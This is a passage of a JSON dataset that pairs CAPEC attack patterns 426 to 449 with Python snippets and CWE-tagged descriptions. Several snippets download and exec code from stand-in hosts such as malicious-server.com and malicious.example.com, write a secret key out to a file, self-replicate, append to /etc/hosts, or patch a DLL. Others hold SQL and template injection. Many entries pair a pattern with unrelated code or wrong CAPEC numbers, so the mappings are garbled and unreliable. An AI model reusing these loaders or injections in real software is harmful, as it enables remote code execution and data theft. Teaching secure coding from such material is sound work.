        "description": "This Python code snippet demonstrates a simplified version of 'Target Influence via Framing' by manipulating data before sending it to a target URL. The `FramingInfluence` class is designed to influence the target by altering the 'important_key' in the data to a 'framed_value'. The `send_request` method sends the manipulated data to the target URL, potentially exploiting CWE-941 (Incorrectly Specified Destination in a Communication Channel) and CWE-300 (Channel Accessible by Non-Endpoint) by not verifying the integrity of the communication channel. The `influence_target` method relies on a single factor (CWE-654) and misrepresents critical information (CWE-451) by changing the value of 'important_key'. This code embodies the main idea of CAPEC by using framing techniques to influence the target's perspective."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "import random\n\nclass User:\n    def __init__(self, username, balance):\n        self.username = username\n        self.balance = balance\n\nclass IncentiveSystem:\n    def __init__(self):\n        self.users = {}\n\n    def add_user(self, username, balance):\n        self.users[username] = User(username, balance)\n\n    def offer_incentive(self, username, incentive_amount):\n        if username in self.users:\n            user = self.users[username]\n            if random.choice([True, False]):  # Simulate peer pressure or random incentive\n                user.balance += incentive_amount\n                print(f\"Incentive offered to {username}. New balance: {user.balance}\")\n            else:\n                print(f\"Incentive not effective for {username}.\")\n        else:\n            print(f\"User {username} not found.\")\n\n# Example usage\nsystem = IncentiveSystem()\nsystem.add_user('alice', 100)\nsystem.add_user('bob', 150)\nsystem.offer_incentive('alice', 50)\nsystem.offer_incentive('bob', 50)\nsystem.offer_incentive('charlie', 50)  # User not found",
        "description": "This Python code snippet represents an incentive system where users can be offered financial incentives. The `IncentiveSystem` class manages users and offers incentives based on a random choice, simulating the unpredictability of peer pressure or other social influences. The code demonstrates the CAPEC concept of 'Influence via Incentives' by attempting to manipulate user behavior through financial rewards. The related CWEs are represented as follows:\n- CWE-1229: The system indirectly creates a new resource (increased balance) that can be exploited.\n- CWE-405: The random incentive offering can lead to asymmetric resource consumption.\n- CWE-941: The system may incorrectly specify the destination (user not found).\n- CWE-656: The system relies on the obscurity of the random choice mechanism.\n- CWE-654: The decision to offer an incentive relies on a single random factor."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "import getpass\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-205: Observable Behavioral Discrepancy\n\n# Simulated user database\nusers = {'admin': 'password123'}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users and users[username] == password:\n        return True\n    return False\n\n# Function to simulate a reflection attack\ndef reflection_attack(target_username):\n    # Attacker uses the target's username to attempt authentication\n    attacker_username = target_username\n    attacker_password = getpass.getpass(prompt='Enter password for {}: '.format(attacker_username))\n    if authenticate(attacker_username, attacker_password):\n        print('Access granted to attacker!')\n    else:\n        print('Access denied to attacker.')\n\n# Main function\nif __name__ == '__main__':\n    # CWE-654: Single factor authentication\n    username = input('Enter username: ')\n    password = getpass.getpass(prompt='Enter password: ')\n    if authenticate(username, password):\n        print('Access granted to user!')\n    else:\n        print('Access denied to user.')\n\n    # CWE-301: Reflection attack simulation\n    reflection_attack('admin')",
        "description": "This Python code snippet demonstrates a simple authentication mechanism that relies on a single factor (username and password) to grant access, embodying CWE-654. The `authenticate` function checks if the provided credentials match those in a simulated user database. The `reflection_attack` function simulates a reflection attack (CWE-301) by prompting the attacker to enter the password for a target username, attempting to gain unauthorized access. The code also highlights CWE-205 by potentially revealing behavioral discrepancies during the authentication process, such as different responses for valid and invalid credentials. This snippet illustrates how psychological principles can be exploited by attackers to influence user behavior and gain unauthorized access."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-301: Reflection Attack in an Authentication Protocol\n\ndef create_server(host, port):\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind((host, port))\n    server_socket.listen(5)\n    print(f'Server listening on {host}:{port}')\n\n    while True:\n        client_socket, addr = server_socket.accept()\n        print(f'Connection from {addr}')\n        handle_client(client_socket)\n\n\ndef handle_client(client_socket):\n    try:\n        # CWE-222: Truncation of Security-relevant Information\n        data = client_socket.recv(1024).decode('utf-8')\n        print(f'Received data: {data[:50]}')  # Truncate data for display\n\n        # CWE-1229: Creation of Emergent Resource\n        if 'create_resource' in data:\n            emergent_resource = open('emergent_resource.txt', 'w')\n            emergent_resource.write('This is an emergent resource.')\n            emergent_resource.close()\n            print('Emergent resource created.')\n\n        # CWE-301: Reflection Attack in an Authentication Protocol\n        if 'auth' in data:\n            client_socket.send(data.encode('utf-8'))  # Reflecting data back\n            print('Reflected data back to client.')\n\n    except Exception as e:\n        print(f'Error handling client: {e}')\n    finally:\n        client_socket.close()\n\n\nif __name__ == '__main__':\n    create_server('127.0.0.1', 65432)",
        "description": "This Python code snippet demonstrates a simple server that listens for incoming connections and handles client requests. The code embodies the main idea of CAPEC-112: 'Influence via Modes of Thinking' by showing how an adversary might manipulate communication channels and resources. The server does not properly verify the source of incoming requests (CWE-940) and allows non-endpoint access (CWE-300). It also demonstrates a reflection attack (CWE-301) by sending received data back to the client. Additionally, it truncates security-relevant information (CWE-222) and creates an emergent resource (CWE-1229) based on client input. This setup can be exploited by an adversary to manipulate the server and gain unauthorized access or information."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import random\n\nclass EyeMovementTracker:\n    def __init__(self):\n        self.internal_state = random.choice(['secure', 'insecure'])\n\n    def track_eye_movement(self, eye_data):\n        if self.internal_state == 'secure':\n            return 'Tracking eye movement securely.'\n        else:\n            return 'Tracking eye movement with potential vulnerabilities.'\n\n    def display_security_status(self):\n        if self.internal_state == 'secure':\n            print('System is secure.')\n        else:\n            print('System is insecure.')\n\n# Simulate eye movement tracking\ntracker = EyeMovementTracker()\neye_data = {'x': 100, 'y': 200}\nprint(tracker.track_eye_movement(eye_data))\ntracker.display_security_status()",
        "description": "This Python code snippet simulates an eye movement tracking system that can be influenced by the internal state of the system, which is randomly set to either 'secure' or 'insecure'. The `track_eye_movement` method returns different messages based on the internal state, representing an observable discrepancy (CWE-203). The `display_security_status` method prints the security status, which could be misleading or misrepresented (CWE-451). This setup embodies the CAPEC idea of gaining information via non-verbal means (eye movements) and highlights potential vulnerabilities related to observable discrepancies and UI misrepresentation."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import logging\nimport time\nimport random\n\n# Setup logging\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# Simulate speculative execution vulnerability\nclass Processor:\n    def __init__(self):\n        self.secret_data = 'Sensitive Information'\n\n    def execute(self, condition):\n        if condition:\n            # Transient execution path\n            logging.debug(f'Executing transient path with secret data: {self.secret_data}')\n            return self.secret_data\n        else:\n            # Correct execution path\n            return 'Public Information'\n\n# Simulate an attack exploiting speculative execution\nprocessor = Processor()\nfor _ in range(10):\n    condition = random.choice([True, False])\n    result = processor.execute(condition)\n    print(f'Execution result: {result}')\n    time.sleep(0.1)",
        "description": "This Python code snippet simulates a speculative execution vulnerability, which is related to the CAPEC and CWEs provided. The Processor class contains sensitive information that should not be exposed. The execute method simulates speculative execution by conditionally logging sensitive data. If the condition is true, it logs and returns the secret data, representing a transient execution path that could expose sensitive information. This demonstrates CWE-1420 (Exposure of Sensitive Information during Transient Execution) and CWE-1342 (Information Exposure through Microarchitectural State after Transient Execution). Additionally, the logging setup and usage represent CWE-532 (Information Exposure Through Log Files), showing how sensitive information can be inadvertently logged and exposed."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    if not validate_syntax(user_input):\n        return f\"Error: Invalid input syntax: {user_input}\", 400\n    try:\n        template = f\"<h1>Welcome {user_input}</h1>\"\n        return render_template_string(template)\n    except Exception as e:\n        return f\"Error: {str(e)}\", 500\n\n@app.route('/error')\ndef error():\n    user_input = request.args.get('input')\n    return f\"<h1>Error: {user_input}</h1>\", 400\n\n\ndef validate_syntax(input_str):\n    # Placeholder for actual syntax validation logic\n    return True\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application using Flask. It demonstrates several weaknesses related to the deprecated CAPEC pattern 'Target Influence via Neuro-Linguistic Programming (NLP)' and associated CWEs. The code does not properly validate the syntax of user input (CWE-1286), improperly neutralizes special characters in a template engine (CWE-1336), and generates error messages that may contain sensitive information (CWE-209). Additionally, it has an excessive attack surface (CWE-1125) by exposing multiple endpoints. The 'submit' route processes user input without adequate validation and directly inserts it into an HTML template, making it susceptible to injection attacks. The 'error' route displays user input in an error message without proper neutralization, leading to potential script injection vulnerabilities."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "import re\n\n# Simulate user input\nuser_input = \"' OR '1'='1\"\n\n# Vulnerable function that improperly validates input\n# and is susceptible to SQL injection\n\ndef vulnerable_query(user_input):\n    # Improper neutralization of quoting syntax (CWE-149)\n    query = f\"SELECT * FROM users WHERE username = '{user_input}'\"\n    print(f\"Executing query: {query}\")\n    # Simulate execution of the query\n    # In a real scenario, this would be sent to a database\n\n# Simulate a CAPTCHA that is guessable (CWE-804)\ndef guessable_captcha():\n    return \"1234\"  # A static CAPTCHA that is easily guessable\n\n# Main function to demonstrate the vulnerabilities\ndef main():\n    # Simulate a user solving the CAPTCHA\n    captcha_solution = guessable_captcha()\n    if captcha_solution == \"1234\":\n        print(\"CAPTCHA solved!\")\n        # Proceed with the vulnerable query\n        vulnerable_query(user_input)\n    else:\n        print(\"CAPTCHA failed!\")\n\nif __name__ == \"__main__\":\n    main()",
        "description": "This Python code snippet demonstrates a vulnerable system that improperly handles user input and uses a guessable CAPTCHA. The `vulnerable_query` function constructs an SQL query using user input without proper validation or neutralization of quoting syntax (CWE-149), making it susceptible to SQL injection attacks. The `guessable_captcha` function returns a static CAPTCHA value, which is easily guessable (CWE-804). The `main` function simulates a user solving the CAPTCHA and then executing the vulnerable query, highlighting the potential security risks."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-120: Buffer Copy without Checking Size of Input\n\ndef send_message(host, port, message):\n    try:\n        # Establish a socket connection\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n\n        # CWE-319: Transmitting sensitive information in cleartext\n        s.sendall(message.encode('utf-8'))\n\n        # CWE-924: No integrity check on the received message\n        response = s.recv(1024)\n        print('Received:', response.decode('utf-8'))\n\n    except Exception as e:\n        print('Error:', e)\n    finally:\n        s.close()\n\n# CWE-120: Buffer Copy without Checking Size of Input\n# This function does not check the size of the input message\n# and directly sends it over the network\nsend_message('localhost', 9999, 'Sensitive Information')",
        "description": "This Python code snippet demonstrates a simple client-server communication where sensitive information is transmitted in cleartext (CWE-319). The `send_message` function establishes a socket connection to a specified host and port, sends a message, and receives a response. The code does not enforce message integrity during transmission (CWE-924), meaning it does not verify if the message was altered during transit. Additionally, the function does not check the size of the input message before sending it, which could lead to a buffer overflow (CWE-120). This example embodies the main idea of the CAPEC by showing how an attacker could exploit these weaknesses to influence the target via communication patterns, embedding messages within the communication that the target's subconscious mind assembles."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "import random\n\nclass SensitiveDataHandler:\n    def __init__(self):\n        self.sensitive_data = {'user1': 'password123', 'user2': 'qwerty'}\n        self.security_policy = {'admin': 'full_access', 'user': 'limited_access'}\n\n    def query_data(self, user_role, query):\n        if user_role not in self.security_policy:\n            return 'Access Denied'\n        if user_role == 'admin':\n            return self.sensitive_data\n        else:\n            # CWE-202: Exposure of Sensitive Information Through Data Queries\n            if 'password' in query:\n                return 'Sensitive information cannot be disclosed'\n            return {k: v for k, v in self.sensitive_data.items() if random.choice([True, False])}\n\n    def captcha_challenge(self):\n        # CWE-804: Guessable CAPTCHA\n        return '1234'  # Easily guessable CAPTCHA\n\nhandler = SensitiveDataHandler()\nprint(handler.query_data('user', 'password'))  # Potentially exposes sensitive data\nprint(handler.captcha_challenge())  # Guessable CAPTCHA",
        "description": "This Python code snippet represents the CAPEC 'Target Influence via Interview and Interrogation' by simulating a scenario where sensitive information can be inferred through data queries (CWE-202) and where a CAPTCHA challenge is easily guessable (CWE-804). The `SensitiveDataHandler` class contains sensitive data and a security policy. The `query_data` method demonstrates how an attacker might infer sensitive information based on the query and the role of the user, while the `captcha_challenge` method returns a static, easily guessable CAPTCHA. This code highlights the vulnerabilities associated with exposing sensitive information and weak security mechanisms."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "import socket\n\n# Vulnerable function to establish a communication channel\n\ndef establish_channel(destination):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((destination, 80))\n        return s\n    except Exception as e:\n        print(f\"Connection error: {e}\")\n        return None\n\n# Function to handle incoming requests without proper verification\ndef handle_request(conn):\n    data = conn.recv(1024)\n    if data:\n        print(f\"Received data: {data}\")\n        # Observable behavioral discrepancy\n        if b'secret' in data:\n            print(\"Sensitive operation triggered\")\n        else:\n            print(\"Normal operation\")\n\n# Example usage\nconn = establish_channel('malicious.example.com')\nif conn:\n    handle_request(conn)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a communication channel, embodying the main idea of 'Target Influence via Instant Rapport' and related CWEs. The 'establish_channel' function attempts to connect to a specified destination without verifying the identity of the endpoint (CWE-300). The 'handle_request' function processes incoming data without verifying the source (CWE-940) and exhibits observable behavioral discrepancies based on the content of the data (CWE-205). This code is vulnerable to external influence and manipulation, as it does not properly secure the communication channel or verify the source and destination of the requests."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "import os\n\nclass Device:\n    def __init__(self, firmware_path):\n        self.firmware_path = firmware_path\n        self.firmware = self.load_firmware()\n\n    def load_firmware(self):\n        if not os.path.exists(self.firmware_path):\n            raise FileNotFoundError('Firmware file not found')\n        with open(self.firmware_path, 'rb') as f:\n            return f.read()\n\n    def verify_firmware(self):\n        # Simulate insufficient verification of firmware integrity\n        return True  # Vulnerable: Always returns True\n\n    def run(self):\n        if not self.verify_firmware():\n            raise ValueError('Firmware verification failed')\n        print('Running device with firmware')\n\n# Simulate a device with potentially malicious firmware\nfirmware_path = 'path/to/malicious/firmware.bin'\ndevice = Device(firmware_path)\ndevice.run()",
        "description": "This Python code snippet represents a simplified scenario where a device loads and runs firmware without sufficient verification, embodying the 'Modification During Manufacture' CAPEC. The `Device` class initializes with a firmware path, loads the firmware, and runs it after a superficial verification. The `verify_firmware` method is intentionally vulnerable, always returning `True`, which simulates a scenario where malicious firmware could be introduced during manufacturing. This example also touches on related CWEs such as reliance on insufficiently trustworthy components (CWE-1357) and insufficient technical documentation (CWE-1059), as the verification process is not robust and lacks proper documentation."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import requests\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# Using a third-party library with known vulnerabilities\nresponse = requests.get('http://example.com/api/data')\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Logging sensitive information that could be exposed\nprint(f'Response: {response.text}')\n\n# CWE-1269: Product Released in Non-Release Configuration\n# Debug mode enabled in production\nDEBUG = True\nif DEBUG:\n    print('Debug mode is enabled')\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\n# Using an untrusted component for critical functionality\ntry:\n    import untrusted_component\n    untrusted_component.perform_critical_task()\nexcept ImportError:\n    print('Failed to import untrusted component')\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n# Different behavior in debug mode\nif DEBUG:\n    print('This message should not appear in production')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Manipulation During Distribution'. It uses a third-party library with known vulnerabilities (CWE-1395), logs sensitive information that could be exposed (CWE-200), has debug mode enabled in production (CWE-1269), relies on an untrusted component for critical functionality (CWE-1357), and exhibits different behavior in debug mode (CWE-207). These issues highlight the risks of tampering and manipulation during the distribution process, where components and configurations may be altered, leading to security vulnerabilities."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "import random\n\nclass HardwareComponent:\n    def __init__(self, version):\n        self.version = version\n        self.redundant_block = True\n        self.voltage_protection = True\n        self.clock_protection = True\n        self.security_version = version\n\n    def inject_error(self):\n        if random.choice([True, False]):\n            self.redundant_block = False\n            print('Error injected: Redundancy degraded.')\n        else:\n            print('Error injection failed.')\n\n    def glitch_voltage_clock(self):\n        self.voltage_protection = False\n        self.clock_protection = False\n        print('Voltage and clock glitch protection disabled.')\n\n    def downgrade_firmware(self, new_version):\n        if new_version < self.version:\n            self.security_version = new_version\n            print(f'Firmware downgraded to version {new_version}.')\n        else:\n            print('Downgrade failed: New version is not older.')\n\n# Example usage\ncomponent = HardwareComponent(version=2.0)\ncomponent.inject_error()\ncomponent.glitch_voltage_clock()\ncomponent.downgrade_firmware(1.0)",
        "description": "This Python code snippet simulates a hardware component that can be attacked by exploiting various weaknesses as described in the CAPEC and related CWEs. The `HardwareComponent` class represents a hardware component with attributes for version, redundancy, and protections against voltage and clock glitches. The `inject_error` method simulates an unauthorized error injection that can degrade the redundancy of the component. The `glitch_voltage_clock` method disables the voltage and clock glitch protections, representing improper protection against such glitches. The `downgrade_firmware` method allows downgrading the firmware to an older, potentially vulnerable version, illustrating the issue of mutable security version numbers. This code embodies the main idea of a hardware integrity attack by demonstrating how an adversary could exploit these weaknesses to compromise the hardware component."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "import os\nimport sys\n\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# CWE-284: Improper Access Control\n# CWE-1277: Firmware Not Updateable\n# CWE-1229: Creation of Emergent Resource\n\ndef malicious_logic():\n    # Malicious payload that hides itself\n    if not os.path.exists('/tmp/malicious_marker'):\n        with open('/tmp/malicious_marker', 'w') as marker:\n            marker.write('This system is compromised.')\n        # Replicating malicious code\n        with open(sys.argv[0], 'r') as source_file:\n            source_code = source_file.read()\n        with open('/tmp/malicious_copy.py', 'w') as malicious_copy:\n            malicious_copy.write(source_code)\n        # Improper access control: modifying system files\n        os.system('echo \"Malicious code executed\" >> /etc/hosts')\n\n# Simulate the insertion of malicious logic into a benign function\nif __name__ == '__main__':\n    print('This is a benign function.')\n    malicious_logic()",
        "description": "This Python code snippet demonstrates the concept of 'Malicious Logic Insertion' by embedding malicious logic into a seemingly benign script. The `malicious_logic` function performs several malicious actions: it creates a marker file to indicate the system is compromised (CWE-506), replicates itself to another location (CWE-509), and improperly modifies a system file (CWE-284). The code simulates the insertion of this malicious logic into a benign function, representing how an adversary might hide malicious activities within a legitimate system. The code also hints at the inability to update firmware (CWE-1277) and the creation of emergent resources (CWE-1229) by modifying system behavior in unintended ways."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "import requests\n\n# Benign function\ndef benign_function():\n    print(\"This is a benign function.\")\n\n# Malicious code hidden within the benign software\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-494: Download of Code Without Integrity Check\n# CWE-508: Non-Replicating Malicious Code\n\n# Hidden malicious function\n# This function is not called directly and is hidden from normal operation\n# It downloads and executes code from a remote server without integrity check\n\ndef hidden_malicious_function():\n    url = \"http://malicious-server.com/malicious_code.py\"\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n\n# Main function that calls the benign function\n# The hidden malicious function is called indirectly\n\ndef main():\n    benign_function()\n    # Hidden call to the malicious function\n    hidden_malicious_function()\n\nif __name__ == \"__main__\":\n    main()",
        "description": "This Python code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The code includes a benign function that appears harmless and a hidden malicious function that downloads and executes code from a remote server without performing an integrity check (CWE-494). The malicious function is embedded within the benign software (CWE-506) and is not directly visible to the user (CWE-507). The malicious code does not replicate itself (CWE-508) and is intended to run on the compromised system. This snippet illustrates how an adversary can insert malicious logic into otherwise benign software, which is then executed behind the scenes."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import os\nimport requests\n\nclass MaliciousModule:\n    def __init__(self):\n        self.url = 'http://malicious.example.com/payload'\n        self.download_and_execute()\n\n    def download_and_execute(self):\n        response = requests.get(self.url)\n        if response.status_code == 200:\n            exec(response.text)\n\n# Insecure permissions example\nos.chmod('/path/to/important/file', 0o777)\n\n# Lack of admin control over security\nclass SecuritySettings:\n    def __init__(self):\n        self.settings = {'encryption': False}\n\n    def apply_settings(self):\n        # Security settings cannot be changed by admin\n        pass\n\n# Injecting the malicious module into the product\nmalicious_instance = MaliciousModule()",
        "description": "This Python code snippet demonstrates the concept of 'Malicious Logic Inserted Into Product by Authorized Developer' (CAPEC). The 'MaliciousModule' class downloads and executes code from a remote location without verifying its integrity (CWE-494). The code also sets insecure permissions on a file (CWE-277) and includes a security settings class that prevents administrators from modifying security settings (CWE-671). This snippet embodies the idea of an insider threat where an authorized developer injects malicious logic into a product, leveraging their privileged position to introduce vulnerabilities."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# This function appears to be a legitimate feature but contains malicious code\n\ndef legitimate_function(data):\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    sensitive_info = os.getenv('SECRET_KEY')\n    print(f\"Processing data: {data}\")\n    # Malicious code: Exfiltrate sensitive information\n    with open('/tmp/exfiltrate.txt', 'w') as f:\n        f.write(sensitive_info)\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# This function dynamically executes code from an untrusted source\n\ndef execute_untrusted_code(untrusted_code):\n    exec(untrusted_code)\n\n# Example usage\nlegitimate_function('user input')\nexecute_untrusted_code('print(\"This is untrusted code execution\")')",
        "description": "This Python code snippet demonstrates a development alteration attack by embedding malicious code within a seemingly legitimate function. The `legitimate_function` appears to process user data but also exfiltrates sensitive information (CWE-506 and CWE-497). Additionally, the `execute_untrusted_code` function improperly handles dynamically-managed code resources by executing untrusted code (CWE-913). This code represents the main idea of CAPEC-Development Alteration, where an adversary modifies the system during development to introduce vulnerabilities that can be exploited later."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n\ndef update_configuration(config_file):\n    with open(config_file, 'a') as f:\n        f.write(\"\\n# Malicious configuration\\n\")\n        f.write(\"os.system('malicious_command')\\n\")\n\n# Simulate configuration management manipulation\nconfig_file = 'config.txt'\nupdate_configuration(config_file)\n\n# Simulate execution of the updated configuration\nexec(open(config_file).read())",
        "description": "This Python code snippet demonstrates a scenario where an adversary manipulates a configuration management system to insert malicious logic into a software product. The code downloads a Python script from an untrusted source (CWE-494) and executes it without verifying its integrity (CWE-829). It then updates a configuration file with malicious commands (CWE-506) and executes the updated configuration, potentially leading to unintended reentrant invocations (CWE-1265) and improper control of dynamically-managed code resources (CWE-913). This embodies the main idea of CAPEC-180, where an adversary exploits configuration management to insert malicious logic into a software product."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import requests\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# Importing a third-party library from an untrusted source\ntry:\n    response = requests.get('http://untrusted-source.com/malicious-library.py')\n    with open('malicious-library.py', 'w') as file:\n        file.write(response.text)\nexcept Exception as e:\n    print(f'Error downloading the library: {e}')\n\n# CWE-506: Embedded Malicious Code\n# Executing the downloaded malicious code\ntry:\n    exec(open('malicious-library.py').read())\nexcept Exception as e:\n    print(f'Error executing the library: {e}')\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\n# Using the potentially malicious and untrusted library\ntry:\n    import malicious_library\n    malicious_library.perform_malicious_action()\nexcept Exception as e:\n    print(f'Error using the library: {e}')",
        "description": "This Python code snippet demonstrates a supply chain attack by including a third-party component from an untrusted source. The code downloads a potentially malicious library from an untrusted URL (CWE-829), writes it to a file, and then executes it (CWE-506). It then attempts to use the downloaded library, which may contain vulnerabilities or malicious actions (CWE-1395, CWE-1357). This example highlights the risks associated with relying on third-party components that are not sufficiently trustworthy or secure."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "import os\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# The server relies on the client to enforce access control, which is insecure.\nclass Server:\n    def __init__(self):\n        self.secret_data = \"Sensitive Information\"\n\n    def get_secret_data(self, user_role):\n        # CWE-657: Violation of Secure Design Principles\n        # Access control is enforced on the client side, which can be easily bypassed.\n        if user_role == 'admin':\n            return self.secret_data\n        else:\n            return \"Access Denied\"\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Sensitive information is exposed to unauthorized users due to poor design.\nclass Client:\n    def __init__(self, server):\n        self.server = server\n\n    def request_data(self, user_role):\n        # CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n        # Assume some security-critical code is optimized away by the compiler.\n        return self.server.get_secret_data(user_role)\n\n# Simulating a design alteration attack\n# An adversary modifies the design to bypass security checks\nserver = Server()\nclient = Client(server)\n\n# Adversary modifies the client to always request data as 'admin'\n# This bypasses the server's access control mechanism\nprint(client.request_data('admin'))  # Outputs: Sensitive Information\nprint(client.request_data('user'))   # Outputs: Sensitive Information (due to design alteration)",
        "description": "This Python code snippet demonstrates a design alteration attack where an adversary modifies the design of a system to achieve a negative impact once deployed. The server class contains sensitive information and relies on the client to enforce access control (CWE-602). The client class requests data from the server, but due to poor design, sensitive information can be exposed to unauthorized users (CWE-497). The code also assumes that some security-critical code might be optimized away by the compiler (CWE-733). The adversary modifies the client to always request data as 'admin', bypassing the server's access control mechanism, which is a violation of secure design principles (CWE-657). This demonstrates how design alterations can lead to significant security vulnerabilities."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import ctypes\nimport os\n\n# CWE-426: Untrusted Search Path\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code\n# CWE-497: Exposure of Sensitive System Information\n\n# Path to the legitimate DLL\nlegit_dll_path = 'C:\\path\\to\\legit.dll'\n\n# Malicious payload to be embedded\nmalicious_code = b'\\x90\\x90\\x90\\x90'  # NOP sled as a placeholder\n\n# Function to embed malicious code into the DLL\ndef embed_virus(dll_path, payload):\n    with open(dll_path, 'rb+') as dll_file:\n        content = dll_file.read()\n        # Find a gap to insert the payload (simplified for demonstration)\n        gap_index = content.find(b'\\x00' * len(payload))\n        if gap_index != -1:\n            dll_file.seek(gap_index)\n            dll_file.write(payload)\n\n# Embed the malicious code into the legitimate DLL\nembed_virus(legit_dll_path, malicious_code)\n\n# Load the tampered DLL (CWE-1102: Reliance on Machine-Dependent Data Representation)\ndll = ctypes.CDLL(legit_dll_path)\n\n# Example function call to the tampered DLL\ntry:\n    dll.some_function()\nexcept Exception as e:\n    print(f'Error: {e}')\n\n# Replicating malicious code (CWE-509)\ndef replicate_virus(target_path):\n    with open(target_path, 'wb') as target_file:\n        with open(__file__, 'rb') as self_file:\n            target_file.write(self_file.read())\n\n# Replicate the virus to another location\nreplicate_virus('C:\\path\\to\\new_location.py')\n\n# Exposure of sensitive system information (CWE-497)\ndef expose_sensitive_info():\n    sensitive_info = os.popen('systeminfo').read()\n    print(sensitive_info)\n\n# Expose sensitive system information\nexpose_sensitive_info()",
        "description": "This Python code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code includes several CWE-related vulnerabilities:\n\n1. **CWE-426 (Untrusted Search Path)**: The code assumes the path to the legitimate DLL without verifying its integrity.\n2. **CWE-506 (Embedded Malicious Code)**: The `embed_virus` function inserts a malicious payload into gaps within the DLL file.\n3. **CWE-509 (Replicating Malicious Code)**: The `replicate_virus` function copies the malicious script to another location, simulating virus replication.\n4. **CWE-497 (Exposure of Sensitive System Information)**: The `expose_sensitive_info` function retrieves and prints sensitive system information.\n5. **CWE-1102 (Reliance on Machine-Dependent Data Representation)**: The code loads and interacts with the tampered DLL, which may behave differently across various systems.\n\nThe main idea is to show how an adversary can tamper with a DLL to embed malicious code, replicate the virus, and expose sensitive information."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
